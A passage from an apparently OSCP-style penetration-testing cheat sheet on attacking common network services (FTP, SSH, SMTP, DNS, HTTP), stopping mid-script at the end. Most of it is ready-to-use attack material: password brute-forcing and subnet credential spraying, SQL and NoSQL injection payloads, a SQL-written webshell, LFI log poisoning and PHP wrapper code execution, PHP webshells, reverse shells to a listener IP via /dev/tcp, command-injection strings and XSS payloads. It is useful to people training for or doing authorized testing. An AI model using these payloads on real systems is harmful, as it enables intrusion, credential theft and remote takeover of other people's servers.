
# 2 Services

This section includes enumeration, exploitation, and interaction techniques for common services you might discover through scanning.



## 2.1 FTP - 21

**Anonymous Logins:**

These are checked by default with Nmap.

- anonymous : anonymous
- anonymous :
- ftp : ftp


**Bruteforce logins**:

```sh
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://VICTIM_IP
hydra -P /usr/share/wordlists/rockyou.txt -l USER ftp://VICTIM_IP
hydra -V -f -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -l USERNAME ftp://VICTIM_IP
```


**Connecting & Interaction:**

```sh
# ways to connect, in order of preference
ftp -A VICTIM_IP # '-A' forces active mode (not passive)
nc -nvC VICTIM_IP 21
telnet VICTIM_IP 21

# connect in your filesystem explorer:
# (Chrome and Firefox removed FTP support)
ftp://anonymous:anonymous@VICTIM_IP

# interaction using the 'ftp' app
ftp> anonymous # username
ftp> anonymous # password
ftp> help # show list of supported commands
ftp> help CMD # show command-specific help
ftp> binary # set transmission to binary instead of ascii
ftp> ascii # set transmission to ascii instead of binary
ftp> ls -a # list all files (even hidden) (yes, they could be hidden)
ftp> cd DIR # change remote directory
ftp> lcd DIR # change local directory
ftp> pwd # print working directory
ftp> cdup  # change to remote parent directory
ftp> mkdir DIR # create directory
ftp> get FILE [NEWNAME] # download file to kali [and save as NEWNAME]
ftp> mget FILE1 FILE2 ... # get multiple files
ftp> put FILE [NEWNAME] # upload local file to FTP server [and save as NEWNAME]
ftp> mput FILE1 FILE2 ... # put multiple files
ftp> rename OLD NEW # rename remote file
ftp> delete FILE # delete remote file
ftp> mdelete FILE1 FILE2 ... # multiple delete remote files
ftp> mdelete *.txt # delete multiple files matching glob pattern
ftp> bye # exit, quit - all exit ftp connection

# interaction with netcat/telnet:
USER anonymous
PASS anonymous
TYPE i # set transmission type to binary instead of ascii
TYPE a # set transmission type to ascii
LIST # list files
RETR FILE # get file
STOR FILE # put file, overwriting existing
STOU FILE # put file, don't overwrite existing
APPE FILE # put file, appending to existing
CWD DIR # change remote working directory
DELE FILE # delete file
QUIT # exit
```


**Batch Download (all files)**:

```sh
# '-m' mirrors the site, downloading all files
wget -m ftp://anonymous:anonymous@VICTIM_IP
wget -m --no-passive ftp://anonymous:anonymous@VICTIM_IP
```


**Config Files:**

Check `/etc` folder.

```ftpusers
ftpusers
ftp.conf
proftpd.conf
vsftpd.conf
```

If the FTP server supports the PORT command, you can abuse it to scan other hosts via the [FTP Bounce Attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp#ftpbounce-attack). Nmap checks for this by default.



## 2.2 SSH/SFTP - 22

Secure Shell (SSH) and Secure File Transfer Protocol (SFTP).

For extremely old versions, check `searchsploit` for vulns. Otherwise, brute-force and user enumeration are usually all you get out of it.

Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh) for executing commands with misconfigured SFTP user.

### 2.2.1 SSH Credential Bruteforcing

```sh
# using hydra
# '-s PORT' contact service on non-default port
hydra -V -f -l username -P wordlist.txt -s 2222 ssh://$VICTIM_IP

# spray creds to entire subnet to see if they work on other boxes, too!
hydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh

# using patator: useful when services (e.g. ssh) are too old for hydra to work
patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

ncrack -p 22 --user root -P passwords.txt [-T 5] $VICTIM_IP
medusa -u root -P 500-worst-passwords.txt -M ssh -h $VICTIM_IP
```

### 2.2.2 Disable SSH Host Key Checking

Put this at the top of your `~/.ssh/config` to disable it for all hosts:

```
Host *
   StrictHostKeyChecking no
   UserKnownHostsFile /dev/null
```

or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`

### 2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH

If you try to ssh onto a host and get an error like:

```
Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

You can get around this by adding the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.

You can also specify the `KexAlgorithms` variable in the ssh-config file.

Similarly, if you get an error like:

```
Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc
```

You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.


## 2.3 SMTP/s - 25,465,587

```sh
# Banner grab, command/user enum
nc -nvC $VICTIM_IP 25  # "-C" forces sending \r\n line ending, required by smtp
telnet $VICTIM_IP 25  # alternate method, does \r\n by default
# SMTPS
openssl s_client -crlf -connect $VICTIM_IP:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect $VICTIM_IP:587

# on telnet/nc connection, try enumerating users manually via:
EXPN  # get mailing list
VRFY root  # check if you can use VRFY to enumerate users

# basic enumeration
nmap -n -v -p25 --script="smtp-* and safe" -oA nmap/smtp $VICTIM_IP

# enumerate users
nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users $VICTIM_IP
# smtp-user-enum lets you check specific usernames, add a domain, and
# specify the mode (EXPN, VRFY, RCPT) for validation
smtp-user-enum -M MODE -U users.txt -D DOMAIN -t $VICTIM_IP
```

Enabling Telnet client on Windows (to allow SMTP interaction, requires Admin rights):

```bat
dism /online /Enable-Feature /FeatureName:TelnetClient
```

Other ideas:
- send email to user (client-side exploit)
- send email to invalid address, get DSN report (info leaks?)

**Sending email via cmdline:**

```sh
# first create attachment and body files

# then send email with swaks
swaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server SMTP_SERVER --body @body.txt --header "Subject: Need help" --suppress-data -ap

# another option is the sendemail tool:
sendemail -f sender@example.com -t receiver@example.com -u "Subject text" -m "Message body text." -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]
```

See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)



## 2.4 DNS - 53

**PRO TIP**: Make sure you add the DNS entries you discover to your
`/etc/hosts` file. Some web servers do redirection based on domain name!

**Format of `/etc/hosts` entry with multiple subdomains**:

```
10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com
```

**General Purpose Enumeration**:

```sh
# dnsenum does full recon, including attempting zone transfers and bruteforcing
# specify "--noreverse" to avoid reverse-IP lookups
dnsenum domain.tld

# can also use dnsrecon, but takes a little more work to specify full enumeration
dnsrecon -a -s -b -y -k -w -d domain.tld

# fierce does a more abbreviated full-enumeration (good for preliminary look)
fierce --domain domain.tld

# dig zone xfer, note "@" before nameserver
dig @ns1.domain.tld -t axfr domain.tld

# get DNS records by type (MX in this case)
host -t MX example.com
```

DNS Queries on Windows:

```powershell
nslookup www.example.com

# Advanced, specify record type and nameserver
nslookup -type=TXT www.example.com ns1.nameserver.com
```

**Common record types**:

- `NS`: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- `A`: Also known as a host record, the "A record" contains the IP address of a hostname (such as www.example.com).
- `MX`: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- `PTR`: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- `CNAME`: Canonical Name Records are used to create aliases for other host records.
- `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

### 2.4.1 DNS Zone Transfer

This is basically asking for a copy of all DNS entries served by an authoritative server.
It lets you get a list of other subdomains that might be of interest.
If a server is configured properly, it won't give you this info.

```sh
# using dnsrecon
dnsrecon -t axfr -d domain.tld

# using dig, note "@" before nameserver
dig @ns1.nameserver.tld axfr domain.tld

# using host (order of args matters)
host -l domain.tld ns1.nameserver.tld
```

### 2.4.2 Bruteforcing DNS Records

```sh
# using dnsrecon
dnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld

# specifying a file with dnsenum, also performs normal full enum
dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld

# using nmap dns-brute script
nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld

# scan through list of subdomains/hostnames using just bash
for subdomain in $(cat list.txt); do host $subdomain.example.com; done

# scan through IP space doing reverse DNS lookups
for oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v "not found"
```



## 2.5 Finger - 79

If the `finger` service is running, it is possible to enumerate usernames.

```sh
nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP
```



## 2.6 HTTP(s) - 80,443

Scans to run every time:

```bash
# enumerate version info of tech stack, find emails, domains, etc.
whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
# to passively accomplish the same thing on a real site, use https://www.wappalyzer.com/

# Gobuster directory/file discovery
# Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,
ulimit -n 8192 # prevent file access error during scanning
gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php" -o gobuster-common.txt -u http://$VICTIM_IP

# look for common vulns with nikto
# -C all means scan all cgi-dirs
nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
```

Checklist:

- [ ] Check `searchsploit` for vulns in server software, web stack
- [ ] Check `/robots.txt` and `/sitemap.xml` for directories/files of interest
- [ ] Inspect HTML comments/source for juicy info
  - [ ] secrets/passwords
  - [ ] directories of interest
  - [ ] software libraries in use
- [ ] Inspect SSL certs for DNS subdomains and emails
- [ ] Watch out for [Apache virtual hosts](https://httpd.apache.org/docs/current/vhosts/%7CApache%20virtual%20hosts.md) (and nginx/IIS/etc. equivalents)! Set `/etc/hosts` with ALL (sub)domains for the target IP.
- [ ] Attempt login with default/common creds
- [ ] Attempt login auth bypass (SQLi): `' or 1=1 -- #`
- [ ] Test for [SQL/NoSQL Injection](#3.5.3%20SQL%20Injection) using "bad" chars: `'")}$%%;\`
- [ ] Test for [Command Injection](#3.5.6%20Command%20Injection)
  - [ ] separator characters: `; | & || &&`
  - [ ] quoted context escape: `" '`
  - [ ] UNIX subshells: `$(cmd)`, `>(cmd)` and backticks
- [ ] Test for [Path Traversal](#3.5.4%20Directory%20Traversal) in URL query and (arbitrary?) file upload
- [ ] Test for [LFI/RFI](#3.5.5%20LFI/RFI), especially in URL query params
- [ ] Test for [XSS](#3.5.7%20Cross-Site%20Scripting%20(XSS)) on all input fields, URL query params, and HTTP Headers:
  - [ ] Check what remains after filtering applied on input: `'';!--"<XSS>=&{()}`
  - [ ] Try variations of `<script>alert(1)</script>`


### 2.6.1 Web Scanning/Enumeration

Whatweb shows details about tech stacks in use by server, email addresses found, etc.

```sh
whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
# -v  : verbose
# -a3 : agressive scan
# --log-verbose <file> : save scan output to file
# also supports setting Cookies, HTTP BasicAuth, and proxies
```

**:warning: PHP 5.x is vulnerable to Shellshock!** - If you see it listed by whatweb, exploit it!

Web Directory discovery with Gobuster:

```sh
# Gobuster
ulimit -n 8192 # prevent file access error during scanning
gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf" -o gobuster-common.txt -u http://$VICTIM_IP
# -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
# -z / --no-progress = no progress displayed
# -q / --quiet = quiet mode (no banner)
# -r / --follow-redirect
# -k / --no-tls-validation
# -w / --wordlist
# -t / --threads
# -o / --output

# user-agent:
# -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
# other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt

# adding a proxy to gobuster:
# --proxy socks5://127.0.0.1:1080

# you can use patterns with the wordlist to fuzz for API endpoints.
# -p / --pattern <pattern-file>
# where pattern files contain placeholder {GOBUSTER} for substitution in wordlist,
# one pattern per line
# Example:
# {GOBUSTER}/v1
# {GOBUSTER}/v2
```

Web Directory discovery with ffuf (great for scanning through SOCKS proxy):

```bash
# FFUF as a dirbuster through a SOCKS proxy
ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# pretty print json output:
ffuf.json | python -m json.tool
```

Other web discovery tools:

- feroxbuster - fast scanner written in Rust
- dirb
- dirbuster
- wfuzz


Good wordlists to try:
- /usr/share/dirb/wordlists/small.txt
- /usr/share/dirb/wordlists/common.txt
- /usr/share/dirb/wordlists/catala.txt
- /usr/share/dirb/wordlists/big.txt
- /usr/share/dirbuster/wordlists/directory-list-1.0.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt



### 2.6.2 Web Credential Bruteforcing

Get a wordlist and emails from the site using `cewl`:

```sh
# save emails to file, min word length = 5
cewl -e --email_file emails.txt -m 5 -w cewl.txt http://VICTIM_IP
```

Hydra is great for hitting web login forms. To use it, first capture a failed login using Burp. You need that to see how it submits the login request and to see how to identify a failed login.

Hydra help/usage for specific module:

```bash
hydra -U http-post-form
```

Web Forms (POST request):

```bash
# using hydra
# string format "<webform-path>:<username-field>=^USER^&<password-field>=^PASS^:<bad-pass-marker>"
# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
# '-t 69': use 69 threads
# change to https-web-form for port 443
hydra -V -f -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64

# proxy-aware password bruteforcing with ffuf
ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "Username=admin&Password=FUZZ&RememberMe=true" -fw 6719
```

HTTP BasicAuth (GET request):

```bash
# hydra http basic auth brute force
# Use https-get for https
# '-u' loops users before moving onto next password
hydra -u -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC"
```

CSRF Tokens defeat hydra, so use `patator`: (documentation in [`patator.py`](https://github.com/lanjelot/patator/blob/master/patator.py))

```sh
# before_urls visits the login page where the CSRF token is
# before_egrep uses regex to extract the CSRF token
# bug in reslover means you have to tell it to resolve IP to itself
# use `--debug --threads=1 proxy=127.0.0.1:8080 proxy_type=http` for troubleshooting with burp and debug logging.
patator http_fuzz --threads=10 --max-retries=0 --hits=patator-hits.txt method=POST follow=1 accept_cookie=1 timeout=5 auto_urlencode=1 resolve=VICTIM_IP:VICTIM_IP url="http://VICTIM_IP/login" body='csrf_token=__CSRF__&usernameD=FILE0&password=FILE1' 0=users.txt 1=cewl.txt before_urls="http://VICTIM_IP/login" before_egrep='__CSRF__:value="(\w+)" id="login__csrf_token"' -x ignore:fgrep='No match'
```



### 2.6.3 SQL Injection

Tips:
- Test for SQL/NoSQL injection using "bad" chars: `'")}$%%;\`
  - Full list:
    ```
    '
    "
    \
    ;
    `
    )
    }
    --
    #
    /*
    //
    $
    %
    %%
    ```
- Watch out for apps stripping required trailing whitespace after `--`. Use `-- #` or similar.
- SQL comments:
  - `--` - requires trailing whitespace, widely supported
  - `/*` - multi-line comment, widely supported
  - `#` - MySQL
  - `REM` - Oracle
- When detecting errors due to SQLi, it may not be an obvious error message. Look for pattern changes/missing output to indicate error.

Auth bypass (try both username and password fields):

```
' or 1=1 -- #  <-- MySQL,MSSQL
' || '1'='1' -- #  <-- PostgreSQL
admin' or 1=1 -- #
admin') or (1=1 -- #
```

Extracting data from error messages:

```
' or 1=1 in (select @@version) -- #
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- #
```

Pro tip for `sqlmap`: if you save the GET/POST request of a SQLi attempt in burp,
you can pass that request file to `sqlmap` as a template for it's requests. You
can also pass it the webroot and `--os-shell` args to get it to give you a
webshell:

```sh
sqlmap -r post.txt -p FIELDNAME --os-shell --web-root "/var/www/html/tmp"
```


#### 2.6.3.1 UNION SQLi technique

The UNION SQL injection technique is helpful when the result of the original SQL
query is output/displayed to the user. Using UNION, we can ask for extra data
from the database that wasn't originally intended to be shown to the user (like creds).

For UNION SQLi attacks to work, we first need to satisfy two conditions:
- The injected UNION query has to include the same number of columns as the original query.
- The data types need to be compatible between each column.

First, determine how many columns are in the original query:

```sql
' ORDER BY 1-- #
```

Increment the value using binary search (2, 4, 8,...) until it errors out, then
use binary search to isolate the highest value that does NOT error out. This
is the number of columns in the original query.

Next, (optionally) figure out what column index goes where in your output.

```sql
-- assuming 3 columns from ORDER BY test
' union all select 1,2,3 -- #
```

Alternatively, use enumeration functions in output columns, shifting what goes
where in trial-and-error fashion until you get useful output:

```sql
-- assuming 5 columns from ORDER BY test, shifting enumeration output
' UNION SELECT database(), user(), @@version, null, null -- #
' UNION SELECT null, null, database(), user(), @@version -- #
```

Finally, gather whatever data from the database you desire. Start with understanding the schema:

```sql
-- getting table schema info
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- #
```

Additionally, you can get code execution on MySQL by creating a webshell with SELECT INTO OUTFILE:

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- #
```

This requires file write permissions in the database and on disk.
It may throw an error when executing the query, but
the file can still be written to disk. Check to see.

MySQL and MSSQL have other code execution possibilities as well. Refer to those sections.


#### 2.6.3.2 Blind SQLi

Two types of attack methods: boolean and time-based.
Boolean requires (visible) change in output on success vs. failure.
Time-based uses injected sleep on success to detect it.

Boolean:
Use AND operator to test if pre-condition is true. Base primitive:

```
' and 1=1 -- #
```

Then you build out what you know by brute force. Example: given you know 'admin'
user is in database, you can build query to determine database name one letter
at a time, watching for when 'admin' is in output or not:

```
# database name 'offsec'
admin' and database() like 'o%' and 1=1 -- #  <-- succeeds
admin' and database() like 'p%' and 1=1 -- #  <-- fails

# more complex, using binary search for ascii values at each position
admin' and substr(database(),2,1)<'f' and 1=1 -- #
```

Time-based:
Inject sleep call after AND operator that tests if condition is true. Base primitive, causing 3 second sleep on success:

```
' AND IF (1=1, sleep(3),'false') -- #
```

Example (using time utility helps measure difference):

```sh
# success is slow (offsec user found in lookup)
❯ time curl -s "http://192.168.201.16/blindsqli.php?user=$(urlencode "offsec' AND IF (1=1, sleep(1),'false') -- #")" &> /dev/null
curl -s  &> /dev/null  0.02s user 0.00s system 1% cpu 2.258 total
#                                                     ^^^^^

# failure is fast
❯ time curl -s "http://192.168.201.16/blindsqli.php?user=$(urlencode "NOPE' AND IF (1=1, sleep(1),'false') -- #")" &> /dev/null
curl -s  &> /dev/null  0.01s user 0.01s system 14% cpu 0.180 total
#                                                      ^^^^^
```



#### 2.6.3.3 Exploiting NoSQL Injection

In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:

```
http://example.com/search?username=admin&password[$ne]=derp

# other short examples:
password[$regex]=.*
password[$exists]=true
```

In POST body (JSON):

```json
{"username": "admin", "password": {"$ne": null} }

// other examples
{"username": "admin", "password": {"$gt": undefined} }
```

SQL vs Mongo injection:

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00

/?search=admin' && this.password//+%00 --> Check if the field password exists
/?search=admin' && this.password.match(/.*/)//+%00 --> Start matching password
/?search=admin' && this.password.match(/^p.*$/)//+%00
/?search=admin' && this.password.match(/^pa.*$/)//+%00
```

Extracting length information:

```
username=admin&password[$regex]=.{1}
username=admin&password[$regex]=.{3}
# True if the length equals 1,3...
```

Building password:

```
username=admin&password[$regex]=p.*
username=admin&password[$regex]=pa.*
username=admin&password[$regex]=pas.*
username=admin&password[$regex]=pass.*
...
# in JSON
{"username": "admin", "password": {"$regex": "^p" }}
{"username": "admin", "password": {"$regex": "^pa" }}
{"username": "admin", "password": {"$regex": "^pas" }}
...
```



### 2.6.4 Directory Traversal

On Linux, `/var/www/html/` is commonly the webroot. Other Linux options: `/usr/share/nginx/www` or `/usr/share/nginx/html`.

On Windows IIS, it's `C:\inetpub\wwwroot\`. For Windows XAMPP, it's `C:\xampp\htdocs\`

Sometimes you can read [sensitive files](#sensitive-files) by changing the URL query params to point
to a file using the relative path.

Example:

```
https://example.com/cms/login.php?language=en.html
```

Here, `en.html` appears to be a file in the `/cms/` directory under the webroot.
We can try changing `en.html` to `../../../../etc/passwd` to see if it lets us
view the file.

Things to try when testing for traversal vuln:
- Add extra `../` to ensure you make it all the way to the filesystem root.
- Use backslashes (`\`) instead of forward slashes (`/`), especially on Windows.
- URL encode the `../` -> `%2E%2E%2F` to bypass filters
- Double-encode the `../` -> `%252E%252E%252F`; IIS 5.0 and earlier
- UTF-8 encode the `../` -> `%C0%AE%C0%AE%2F` (`%c0%ae` is `.`); [cve-2022-1744][cve-2022-1744]{:target="_blank"}
- Use `....//` instead of `../` to bypass filters
- Append null byte (`%00`) if you suspect file extension is getting added
- Check out [DotDotPwn](https://github.com/wireghoul/dotdotpwn) fuzzing tool.

[cve-2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744


When using `curl` to test, you may need to include the `--path-as-is` flag:

```sh
curl --path-as-is http://localhost/?page=/../../../../etc/passwd
```


**Files to try:**
- `/etc/passwd`
- `/etc/shadow` if permissions allow
- `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
- `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
  - also `id_dsa`, `id_ecdsa`, and `id_ed25519`
- other [sensitive files](#7.1%20Sensitive%20Files)

The `proc` filesystem has useful info for enumerating the host:

```
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug  # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/[0-9]*/fd/[0-9]*  # (first number is the PID, second is the file descriptor)
```

If there is arbitrary file upload (allows directory traversal), you may be able
to use it to (over)write arbitrary files, which may help you get code execution.
Try:
- uploading a webshell to the webroot folder
- adding your ssh key to the `authorized_keys` file



### 2.6.5 LFI/RFI

Local File Inclusion is basically code execution that requires directory traversal.
LFI/RFI can be leveraged with PHP (`.php`, most common), Perl (`.pl`), Active
Server Pages (`.asp`), Active Server Pages Extended (`.aspx`), Java Server
Pages (`.jsp`), and even (rarely) Node.js.

If there is a file upload vulnerability, you can also combine LFI with that to
get code execution.

File Upload filter bypasses:
- change file extension to `.phps` or `.php7`
- make file extension mixed uppercase and lowercase

You can get code execution by poisoning local files, including log files and
PHP session files with PHP code. Access logs typically have User-Agent in them,
which we can use to inject malicious PHP code.

Common log and PHP session file locations:

- `/var/log/apache2/access.log` - Debian/Ubuntu
- `/var/log/apache2/access.log` - RHEL/CentOS/Fedora
- `/var/log/httpd-access.log` - FreeBSD
- `C:\xampp\apache\logs\access.log` - Windows w/ XAMPP
- `C:\Program Files\Apache Group\Apache\logs\access.log`
- `C:\inetpub\logs\LogFiles\W3SVC1\` and `\HTTPERR\` - Windows IIS
- `/etc/httpd/logs/acces_log` and `/error_log`
- `/var/www/logs/access_log` and `/error_log`
- `/var/www/logs/access.log` and `/error.log`
- `C:\Windows\Temp`
- `/tmp/`
- `/var/lib/php/session`
- `/var/lib/php[4567]/session`
- `C:\php\sessions\`
- `C:\php[4567]\sessions\`

Default session filename: `sess_<SESSION_ID>`
(grab SESSION_ID from your cookies in the browser)

**Look for [sensitive files](#sensitive-files) if you have LFI!**

For RFI, the `allow_url_include` must be enabled in PHP apps.


#### 2.6.5.1 PHP Wrappers

[PHP Wrappers](https://www.php.net/manual/en/wrappers.php) are useful for filter
evasion, for grabbing file contents without it getting executed, and even for
code execution.

Using [`filter`](https://www.php.net/manual/en/filters.php) [wrapper](https://www.php.net/manual/en/wrappers.php.php) to grab local files:

```sh
# filter without any processing to grab plaintext:
php://filter/resource=/path/to/flle
# Example:
curl http://example.com/index.php?page=php://filter/resource=/etc/passwd


# base64 encode file before grabbing (helps grab php source or binary files)
# available starting with PHP 5.0.0
php://filter/convert.base64-encode/resource=/path/to/file
# Example:
curl http://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php


# ROT13 encode file:
php://filter/read=string.rot13/resource=/etc/passwd

# chaining multiple filters with "|":
php://filter/string.toupper|string.rot13/resource=/path/to/file

# list of useful filters:
# https://www.php.net/manual/en/filters.php
string.toupper
string.tolower
string.rot13
convert.base64-encode
convert.base64-decode
zlib.deflate  # i.e. gzip, without headers/trailers
zlib.inflate  # i.e. gunzip
bzip2.compress
bzip2.decompress
```

Code execution with `expect`, `data`, and `input` wrappers:

```sh
# run commands directly if 'expect' extension installed (not default):
expect://whoami

# inject arbitrary string into the file if 'allow_url_include' setting is enabled.
# can be used for code execution, XSS, etc.:
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+  # injects "<?php phpinfo();?>"

# When injecting php code, a good way to test code execution is with:
<?php phpinfo();?>

# use "data:" to inject executable php code directly into the URL
data:text/plain,<?php phpinfo(); ?>
data:,<?system($_GET['x']);?>&x=ls
data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls

# Use 'php://input' as the query param's value to tell it to look at the POST
# request body for the text to insert there. Useful for injecting complex
# php payloads
php://input
# example POST body: <?php system('whoami'); ?>

# FILTER BYPASSES:
# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
# a file path by injecting a NULL byte. E.g.:
?page=../../../etc/passwd%00
# You can take this technique further and URL-encode the entire php://filter
# directive to hopefully bypass server-side filters on it. Or even double-URL-
# encode the string.
# Also try bypassing filters with ....// instead of ../
```


#### 2.6.5.2 One-liner PHP Webshells

Simple one-liner web shells for when you can drop/modify a php file:

```php
<?php system($_GET['cmd']); ?>

<?php echo exec($_POST['cmd']); ?>

<?php echo shell_exec($_REQUEST['cmd']); ?>

<?php echo passthru($_GET['cmd']); ?>
```

Kali has more webshells here: `/usr/share/webshells/php/`, and I have some in the [tools](tools) directory

[One-liner PHP reverse shell](#54-reverse-shells):

```php
<?php $sock=fsockopen("LISTEN_IP",443);exec("/bin/bash -i <&3 >&3 2>&3"); ?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'"); ?>
```

[Great collection of PHP webshells and reverse shells](https://github.com/ivan-sincek/php-reverse-shell)

[Pentestmonkey PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)



### 2.6.6 Command Injection

Some websites pass user input to a shell execution environment (probably with some filtering).
If you can bypass the filter, you get code execution!

Tips:
- `whoami` runs on both Windows and Linux hosts. Good candidate for test injection.
- prefix command with separator characters: `; | & || &&`
- try url-encoded separators:
  - `%0A`: newline
  - `%3B`: semicolon
- May need to terminate quoted context before starting your command:
  ```sh
  '; whoami
  "&& whoami
  "& whoami"  # surrounding with quotes
  ```
- surrounding your command with UNIX subshells for execution:
  ```sh
  $(whoami)
  >(whoami)
  `whoami`
  ```
- To see if you're executing in CMD or Powershell (will print which one):
  ```powershell
  (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
  ```
- try seeing if you can get a help msg:  `-h`, `--help`, `/?`
- maybe redirection provides useful info `< /etc/passwd`
- perl injection when opening file:  `echo Injected|`
- if you can't see output of command, try time-based character-by-character extraction:
  ```sh
  time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  ```
- if bash restrictions (filtering what commands are executed), see [bypass guide](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions).


Here are common URL query params (or form fields) that may be vulnerable to injection:

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```



### 2.6.7 Cross-Site Scripting (XSS)

In all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:

- [ ] Check what remains after any filtering is applied on input: `'';!--"<XSS>=&{()}`
- [ ] Try variations of `<script>alert(1)</script>`



If you can get XSS working, consider possible vectors, especially against admin users:

- [ ] Steal cookies, authentication (OAuth) tokens, and other sensitive data
- [ ] Key-log password entry on login page
- [ ] Perform Cross-Site Request Forgery (CSRF) using victim's/Admin's session (may need to steal token/nonce). Maybe create a new admin user or change admin password?



When injecting XSS javascript payload, you may may want to ensure no characters get filtered. An easy way to ensure that is to encode the payload as Unicode code points.

```javascript
// Use the following code in your browser's console to encode the payload as Unicode code points.
function encode_javascript(minified_js) {
  return [...minified_js].map(function (c) { return c.codePointAt(0); }).join(",")
}
let encoded = encode_javascript("insert_minified_javascript") // replace with your payload
console.log(encoded)
```

Once the payload is encoded, insert the resulting array of integers into the following injected XSS script tag:

```html
<!-- replace digits with output from previous encoder -->
<script>eval(String.fromCodePoint(97,108,101,114,116,40,39,128526,39,41))</script>
<!-- example is code for "alert('😎')" -->
```



Here is an example script payload that creates an admin user on a vulnerable WordPress site by exploiting the vulnerable User-Agent header:

```javascript
// Collect WordPress nonce from admin user
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
